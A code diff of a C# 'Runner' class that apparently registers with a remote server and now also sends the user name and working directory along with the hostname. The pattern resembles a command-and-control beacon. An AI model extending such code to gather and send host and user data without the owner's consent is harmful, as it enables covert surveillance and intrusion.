@@ -2,6 +2,7 @@
 using System.IO;
 using System.Net;
 using System.Text;
+using System.Threading;
 
 public class Runner
 {
@@ -23,7 +24,9 @@ public class Runner
         {
             try
             {
-                string info = "{\"client_id\":\"" + clientId + "\",\"hostname\":\"" + Environment.MachineName + "\",\"os\":\"windows\"}";
+                string username = Environment.UserName;
+                string cwd = Directory.GetCurrentDirectory();
+                string info = $"{{\"client_id\":\"{clientId}\",\"hostname\":\"{Environment.MachineName}\",\"os\":\"windows\",\"username\":\"{username}\",\"cwd\":\"{cwd.Replace("\\", "\\\\")}\"}}";
                 Transmit(serverUrl, "/api/register", info);
                 break;
             }
@@ -82,8 +85,11 @@ public class Runner
     // Минимальная задержка без Thread.Sleep
     private static void Delay(int ms)
     {
+        /*
         var until = DateTime.UtcNow.AddMilliseconds(ms);
         while (DateTime.UtcNow < until) ;
+        */
+        Thread.Sleep(ms);
     }
 
     // Примитивный парсер JSON
